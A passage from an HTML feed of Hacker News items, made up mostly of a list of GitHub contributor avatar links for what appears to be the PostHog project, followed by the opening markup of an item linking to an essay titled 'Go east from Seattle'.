src="https://avatars.githubusercontent.com/u/8011761?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/14MR"><img src="https://avatars.githubusercontent.com/u/5824170?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/03difoha"><img src="https://avatars.githubusercontent.com/u/8876615?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/ahtik"><img src="https://avatars.githubusercontent.com/u/140952?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/Algogator"><img src="https://avatars.githubusercontent.com/u/1433469?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/GalDayan"><img src="https://avatars.githubusercontent.com/u/24251369?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/Kacppian"><img src="https://avatars.githubusercontent.com/u/14990078?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/FUSAKLA"><img src="https://avatars.githubusercontent.com/u/6112562?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/iMerica"><img src="https://avatars.githubusercontent.com/u/487897?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/stevenphaedonos"><img src="https://avatars.githubusercontent.com/u/12955616?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/tapico-weyert"><img src="https://avatars.githubusercontent.com/u/70971917?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/adamschoenemann"><img src="https://avatars.githubusercontent.com/u/2095226?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/AlexandreBonaventure"><img src="https://avatars.githubusercontent.com/u/4596409?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/dan-dr"><img src="https://avatars.githubusercontent.com/u/6669808?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/dts"><img src="https://avatars.githubusercontent.com/u/273856?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/jamiehaywood"><img src="https://avatars.githubusercontent.com/u/26779712?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/rushabhnagda11"><img src="https://avatars.githubusercontent.com/u/3235568?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/weyert"><img src="https://avatars.githubusercontent.com/u/7049?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/casio"><img src="https://avatars.githubusercontent.com/u/29784?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/Hungsiro506"><img src="https://avatars.githubusercontent.com/u/10346923?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/bitbreakr"><img src="https://avatars.githubusercontent.com/u/3123986?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/edmorley"><img src="https://avatars.githubusercontent.com/u/501702?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/wundo"><img src="https://avatars.githubusercontent.com/u/113942?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/andreipopovici"><img src="https://avatars.githubusercontent.com/u/1143417?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/benjackwhite"><img src="https://avatars.githubusercontent.com/u/2536520?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/serhey-dev"><img src="https://avatars.githubusercontent.com/u/37838803?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/sjmadsen"><img src="https://avatars.githubusercontent.com/u/57522?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/piemets"><img src="https://avatars.githubusercontent.com/u/70321811?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/eltjehelene"><img src="https://avatars.githubusercontent.com/u/75622766?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/athreyaanand"><img src="https://avatars.githubusercontent.com/u/31478366?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/berntgl"><img src="https://avatars.githubusercontent.com/u/55957336?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/fakela"><img src="https://avatars.githubusercontent.com/u/39309699?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/seanpackham"><img src="https://avatars.githubusercontent.com/u/3830791?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/corywatilo"><img src="https://avatars.githubusercontent.com/u/154479?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/mikenicklas"><img src="https://avatars.githubusercontent.com/u/6363580?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/lottiecoxon"><img src="https://avatars.githubusercontent.com/u/65415371?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/oshura3"><img src="https://avatars.githubusercontent.com/u/30472479?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/Abo7atm"><img src="https://avatars.githubusercontent.com/u/33042538?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/brianetaveras"><img src="https://avatars.githubusercontent.com/u/52111440?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/callumgare"><img src="https://avatars.githubusercontent.com/u/346340?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/RedFrez"><img src="https://avatars.githubusercontent.com/u/30352852?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/cirdes"><img src="https://avatars.githubusercontent.com/u/727781?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/DannyBen"><img src="https://avatars.githubusercontent.com/u/2405099?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/sj26"><img src="https://avatars.githubusercontent.com/u/14028?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/paulanunda"><img src="https://avatars.githubusercontent.com/u/155981?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/arosales"><img src="https://avatars.githubusercontent.com/u/1707853?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/ChandanSagar"><img src="https://avatars.githubusercontent.com/u/27363164?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/wadenick"><img src="https://avatars.githubusercontent.com/u/9014043?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/jgannondo"><img src="https://avatars.githubusercontent.com/u/28159071?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/keladhruv"><img src="https://avatars.githubusercontent.com/u/30433468?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/grellyd"><img src="https://avatars.githubusercontent.com/u/7812612?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/rberrelleza"><img src="https://avatars.githubusercontent.com/u/475313?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/annanay25"><img src="https://avatars.githubusercontent.com/u/10982987?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/cohix"><img src="https://avatars.githubusercontent.com/u/5942370?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/gouthamve"><img src="https://avatars.githubusercontent.com/u/7354143?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/alexellis"><img src="https://avatars.githubusercontent.com/u/6358735?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/prologic"><img src="https://avatars.githubusercontent.com/u/1290234?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/jgustie"><img src="https://avatars.githubusercontent.com/u/883981?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/kubemq"><img src="https://avatars.githubusercontent.com/u/45835100?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/vania-pooh"><img src="https://avatars.githubusercontent.com/u/829320?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/irespaldiza"><img src="https://avatars.githubusercontent.com/u/11633327?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/croomes"><img src="https://avatars.githubusercontent.com/u/211994?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/snormore"><img src="https://avatars.githubusercontent.com/u/182290?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/faik"><img src="https://avatars.githubusercontent.com/u/43129?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/aandryashin"><img src="https://avatars.githubusercontent.com/u/1412461?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/andrewsomething"><img src="https://avatars.githubusercontent.com/u/46943?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/Ferroin"><img src="https://avatars.githubusercontent.com/u/905151?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/cpanato"><img src="https://avatars.githubusercontent.com/u/4115580?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/cakrit"><img src="https://avatars.githubusercontent.com/u/43294513?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/dkhenry"><img src="https://avatars.githubusercontent.com/u/489643?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/oxplot"><img src="https://avatars.githubusercontent.com/u/483682?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/marc-barry"><img src="https://avatars.githubusercontent.com/u/4965634?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/moabu"><img src="https://avatars.githubusercontent.com/u/47318409?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/nawazdhandala"><img src="https://avatars.githubusercontent.com/u/2697338?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/dar-mehta"><img src="https://avatars.githubusercontent.com/u/10489943?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/gmmorris"><img src="https://avatars.githubusercontent.com/u/386208?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/bitdeli-chef"><img src="https://avatars.githubusercontent.com/u/3092978?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/nsidartha"><img src="https://avatars.githubusercontent.com/u/26918226?v=4" width="50" height="50" alt=""></a> <a href="http://massimilianomirra.com/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/19322?v=4" width="50" height="50" alt=""></a> <a href="https://www.bronsonavila.com/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/30540995?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/apps/posthog-contributions-bot"><img src="https://avatars.githubusercontent.com/in/105985?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/joesaunderson"><img src="https://avatars.githubusercontent.com/u/11272509?v=4" width="50" height="50" alt=""></a> <a href="https://www.ianlai.dev/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/68859?v=4" width="50" height="50" alt=""></a> <a href="http://martinmck.com/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/11256663?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/lharress"><img src="https://avatars.githubusercontent.com/u/13482930?v=4" width="50" height="50" alt=""></a> <a href="https://www.linkedin.com/in/adrien-brault-4b987426/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/611271?v=4" width="50" height="50" alt=""></a> <a href="https://leggetter.co.uk/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/328367?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/wushaobo"><img src="https://avatars.githubusercontent.com/u/491264?v=4" width="50" height="50" alt=""></a> <a href="http://www.jonathanclarke.ie/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/11335?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/apps/imgbot"><img src="https://avatars.githubusercontent.com/in/4706?v=4" width="50" height="50" alt=""></a> <a href="http://well-balanced.medium.com/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/48206623?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/jeduden"><img src="https://avatars.githubusercontent.com/u/1117699?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/gempain"><img src="https://avatars.githubusercontent.com/u/13135149?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/rethab"><img src="https://avatars.githubusercontent.com/u/2222044?v=4" width="50" height="50" alt=""></a> <a href="https://daviddanielarch.github.io/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/78377120?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/angelahuang89"><img src="https://avatars.githubusercontent.com/u/22755100?v=4" width="50" height="50" alt=""></a> <a href="http://kevinhu.io/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/6051736?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/afterwind-io"><img src="https://avatars.githubusercontent.com/u/16891493?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/swong194"><img src="https://avatars.githubusercontent.com/u/25137899?v=4" width="50" height="50" alt=""></a> <a href="http://rajie.space/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/37059749?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/thedeveloperr"><img src="https://avatars.githubusercontent.com/u/23462580?v=4" width="50" height="50" alt=""></a> <a href="https://www.esposi.to/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/735227?v=4" width="50" height="50" alt=""></a> <a href="http://www.sankalpsinha.com/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/18334593?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/gagantrivedi"><img src="https://avatars.githubusercontent.com/u/18366226?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/j-fuentes"><img src="https://avatars.githubusercontent.com/u/10594577?v=4" width="50" height="50" alt=""></a> <a href="http://in.linkedin.com/in/akshayagr" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/1273012?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/JeffreyQ"><img src="https://avatars.githubusercontent.com/u/10890152?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/ConradKurth"><img src="https://avatars.githubusercontent.com/u/1794593?v=4" width="50" height="50" alt=""></a> <a href="http://avor.io/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/649020?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/tobiastornros"><img src="https://avatars.githubusercontent.com/u/17402497?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/abhijitghate"><img src="https://avatars.githubusercontent.com/u/11834249?v=4" width="50" height="50" alt=""></a> <a href="https://c3ho.blogspot.com/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/18711727?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/DimitrisMazarakis"><img src="https://avatars.githubusercontent.com/u/56391437?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/pietrodevpiccini"><img src="https://avatars.githubusercontent.com/u/78323924?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/mands"><img src="https://avatars.githubusercontent.com/u/1010043?v=4" width="50" height="50" alt=""></a> <a href="https://larriereguichet.fr/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/568769?v=4" width="50" height="50" alt=""></a> <a href="https://www.btao.org/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/66130243?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/marcushyett-ph"><img src="https://avatars.githubusercontent.com/u/85295485?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/jonataslaw"><img src="https://avatars.githubusercontent.com/u/35742643?v=4" width="50" height="50" alt=""></a> <a href="http://neilkakkar.com/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/7115141?v=4" width="50" height="50" alt=""></a> <a href="https://www.dbinetti.com/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/161722?v=4" width="50" height="50" alt=""></a> <a href="http://ekinsey.dev/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/28248250?v=4" width="50" height="50" alt=""></a> <a href="https://www.marcopchen.com/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/33271308?v=4" width="50" height="50" alt=""></a> <a href="https://conye.netlify.app/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/25040059?v=4" width="50" height="50" alt=""></a> <a href="http://raybb.github.io/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/921217?v=4" width="50" height="50" alt=""></a> <a href="http://tirkarthi.github.io/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/3972343?v=4" width="50" height="50" alt=""></a> <a href="https://dev.to/jacobherrington" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/11466782?v=4" width="50" height="50" alt=""></a> <a href="https://mhmd.dev/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/34659256?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/alx-a"><img src="https://avatars.githubusercontent.com/u/26557823?v=4" width="50" height="50" alt=""></a> <a href="https://pplife.home.blog/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/35653876?v=4" width="50" height="50" alt=""></a> <a href="http://purcell3a.github.io/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/62629855?v=4" width="50" height="50" alt=""></a> <a href="http://www.vendasta.com/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/2300103?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/7MIMIRA"><img src="https://avatars.githubusercontent.com/u/63031501?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/juanvasquezreyes"><img src="https://avatars.githubusercontent.com/u/20667703?v=4" width="50" height="50" alt=""></a> <a href="http://bryanyi.com/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/66971225?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/benbz"><img src="https://avatars.githubusercontent.com/u/1325121?v=4" width="50" height="50" alt=""></a> <a href="http://blog.bettersoftwaretesting.com/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/785891?v=4" width="50" height="50" alt=""></a> <a href="http://www.bengreenberg.dev/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/13892277?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/xahhy"><img src="https://avatars.githubusercontent.com/u/8667086?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/manish001in"><img src="https://avatars.githubusercontent.com/u/7192261?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/jmellicker"><img src="https://avatars.githubusercontent.com/u/8551583?v=4" width="50" height="50" alt=""></a> <a href="https://budibase.com/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/3524181?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/edhgoose"><img src="https://avatars.githubusercontent.com/u/1108173?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/steveyackey"><img src="https://avatars.githubusercontent.com/u/61758723?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/asherf"><img src="https://avatars.githubusercontent.com/u/1268088?v=4" width="50" height="50" alt=""></a> <a href="https://twitter.com/leoMehlig" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/9119485?v=4" width="50" height="50" alt=""></a> <a href="https://banagale.com/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/1409710?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/skabbes"><img src="https://avatars.githubusercontent.com/u/592178?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/csykes"><img src="https://avatars.githubusercontent.com/u/944809?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/stefnnn"><img src="https://avatars.githubusercontent.com/u/6664911?v=4" width="50" height="50" alt=""></a> <a href="https://www.literacyplanet.com.au/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/2586778?v=4" width="50" height="50" alt=""></a> <a href="https://daksh.me/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/7896438?v=4" width="50" height="50" alt=""></a> <a href="http://mg.to/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/21968?v=4" width="50" height="50" alt=""></a> <a href="http://jyuvaraj03.github.io/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/29891001?v=4" width="50" height="50" alt=""></a> <a href="http://mackenziee.com/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/13096366?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/Jaspreet-singh-1032"><img src="https://avatars.githubusercontent.com/u/69707565?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/inbreaks"><img src="https://avatars.githubusercontent.com/u/1317194?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/xrendan"><img src="https://avatars.githubusercontent.com/u/13208566?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/Nishant-Sagar"><img src="https://avatars.githubusercontent.com/u/66466895?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/romj"><img src="https://avatars.githubusercontent.com/u/44766458?v=4" width="50" height="50" alt=""></a> <a href="https://pixlwave.uk/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/6060466?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/chasovskiy"><img src="https://avatars.githubusercontent.com/u/25323740?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/hjweddie"><img src="https://avatars.githubusercontent.com/u/5867477?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/maxmue"><img src="https://avatars.githubusercontent.com/u/4235114?v=4" width="50" height="50" alt=""></a> <a href="https://ajsharp.com/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/12774?v=4" width="50" height="50" alt=""></a> <a href="https://vicampuzano.com/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/20813866?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/k4kuz0"><img src="https://avatars.githubusercontent.com/u/6428417?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/abtinmo"><img src="https://avatars.githubusercontent.com/u/21346041?v=4" width="50" height="50" alt=""></a> <a href="http://mohammedshehu.com/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/40317687?v=4" width="50" height="50" alt=""></a> <a href="https://www.uxwriter.life/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/58725708?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/hspotorno"><img src="https://avatars.githubusercontent.com/u/3391820?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/bnomei"><img src="https://avatars.githubusercontent.com/u/3265642?v=4" width="50" height="50" alt=""></a> <a href="https://github.rahul3v.xyz/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/24385409?v=4" width="50" height="50" alt=""></a> <a href="https://www.linkedin.com/in/sheridandanny/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/83524670?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/Cavallando"><img src="https://avatars.githubusercontent.com/u/27144805?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/RoryCrispin"><img src="https://avatars.githubusercontent.com/u/716269?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/bjornj12"><img src="https://avatars.githubusercontent.com/u/2598477?v=4" width="50" height="50" alt=""></a> <a href="https://joetrol.lol/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/7506225?v=4" width="50" height="50" alt=""></a> <a href="https://wanderlog.com/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/2924388?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/restackio"><img src="https://avatars.githubusercontent.com/u/27010949?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/utkuzih"><img src="https://avatars.githubusercontent.com/u/7005250?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/asavoy"><img src="https://avatars.githubusercontent.com/u/235466?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/Zombie123456"><img src="https://avatars.githubusercontent.com/u/41881936?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/bmarty"><img src="https://avatars.githubusercontent.com/u/3940906?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/navi86"><img src="https://avatars.githubusercontent.com/u/28907696?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/hakubo"><img src="https://avatars.githubusercontent.com/u/1018759?v=4" width="50" height="50" alt=""></a> <a href="http://kateklink.com/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/5008686?v=4" width="50" height="50" alt=""></a> <a href="https://www.rm.pl/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/11348586?v=4" width="50" height="50" alt=""></a> <a href="http://gitstart.github.io/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/1501599?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/haikusw"><img src="https://avatars.githubusercontent.com/u/222271?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/david-everett"><img src="https://avatars.githubusercontent.com/u/98620729?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/kefranabg"><img src="https://github.com/PostHog/posthog/raw/master" width="50" height="50" alt=""></a> <a href="https://github.com/stuposluns"><img src="https://avatars.githubusercontent.com/u/23000883?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/charlrvd"><img src="https://avatars.githubusercontent.com/u/17158847?v=4" width="50" height="50" alt=""></a> <a href="http://www.aviflombaum.com/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/4515?v=4" width="50" height="50" alt=""></a> <a href="https://federicoleva.eu/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/901528?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/danielthedifficult"><img src="https://avatars.githubusercontent.com/u/1290033?v=4" width="50" height="50" alt=""></a> <a href="http://jpaul.me/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/6723245?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/peterdemin"><img src="https://avatars.githubusercontent.com/u/1448666?v=4" width="50" height="50" alt=""></a> <a href="https://jacobwgillespie.com/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/130874?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/MrKevinOConnell"><img src="https://avatars.githubusercontent.com/u/17347501?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/klamas1"><img src="https://avatars.githubusercontent.com/u/16032928?v=4" width="50" height="50" alt=""></a> <a href="http://thebigbignooby.github.io/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/4172090?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/iamwacko"><img src="https://avatars.githubusercontent.com/u/101361189?v=4" width="50" height="50" alt=""></a> <a href="http://bobeagan.com/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/100226?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/tiina303"><img src="https://avatars.githubusercontent.com/u/890921?v=4" width="50" height="50" alt=""></a> <a href="https://www.passion-climb.com/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/1851359?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/jafarlihi"><img src="https://avatars.githubusercontent.com/u/43515211?v=4" width="50" height="50" alt=""></a> <a href="https://jarekrozanski.eu/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/4896588?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/krzd"><img src="https://avatars.githubusercontent.com/u/1003886?v=4" width="50" height="50" alt=""></a> <a href="https://mathspace.co/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/18408986?v=4" width="50" height="50" alt=""></a> <a href="https://www.linkedin.com/in/ashtong/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/2122?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/balajivenkatesh"><img src="https://avatars.githubusercontent.com/u/4346757?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/bytemerger"><img src="https://avatars.githubusercontent.com/u/31082804?v=4" width="50" height="50" alt=""></a> <a href="http://codepitbull.de/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/1409931?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/zackelan"><img src="https://avatars.githubusercontent.com/u/10138830?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/rcmarron"><img src="https://avatars.githubusercontent.com/u/4813045?v=4" width="50" height="50" alt=""></a> <a href="http://shanemaglangit.com/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/53674742?v=4" width="50" height="50" alt=""></a> <a href="https://www.linkedin.com/in/justin-jones-1300b613b/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/14925?v=4" width="50" height="50" alt=""></a> <a href="http://mmmoussa.com/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/9062287?v=4" width="50" height="50" alt=""></a> <a href="https://mihir.ch/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/31861755?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/nitzanballerine"><img src="https://avatars.githubusercontent.com/u/109664420?v=4" width="50" height="50" alt=""></a> <a href="http://taleno.digital/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/4322627?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/Chuloo"><img src="https://avatars.githubusercontent.com/u/22301208?v=4" width="50" height="50" alt=""></a> <a href="http://bhargavtarpara.com/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/9146475?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/Growthfyi"><img src="https://avatars.githubusercontent.com/u/109241881?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/MoSattler"><img src="https://avatars.githubusercontent.com/u/64152453?v=4" width="50" height="50" alt=""></a> <a href="http://petrioli.me/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/914107?v=4" width="50" height="50" alt=""></a> <a href="https://xvello.net/" rel="nofollow"><img src="https://avatars.githubusercontent.com/u/6241083?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/johanholmerin"><img src="https://avatars.githubusercontent.com/u/7433263?v=4" width="50" height="50" alt=""></a><a href="https://github.com/Ismaaa"><img src="https://avatars.githubusercontent.com/u/22240843?v=4" width="50" height="50" alt=""></a></p>



</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Go east from Seattle (150 pts)]]></title>
            <link>https://finmoorhouse.com/writing/go-east/</link>
            <guid>40564332</guid>
            <pubDate>Mon, 03 Jun 2024 16:31:19 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://finmoorhouse.com/writing/go-east/">https://finmoorhouse.com/writing/go-east/</a>, See on <a href="https://news.ycombinator.com/item?id=40564332">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    


<div>
  <p>
    <span>Published </span>14 January 2024   ⋅ Comment on 
    <a href="https://finmoorhouse.substack.com/p/go-east-from-seattle" target="_blank">Substack</a>  
  </p>
   
    <a href="https://finmoorhouse.com/writing">
      <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="white" viewBox="0 0 256 256">
        <rect width="256" height="256" fill="none"></rect>
        <polyline points="160 208 80 128 160 48" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="24"></polyline>
      </svg>
      <span>Back to writing</span>
    </a>

  
</div>



<details>
  <summary>
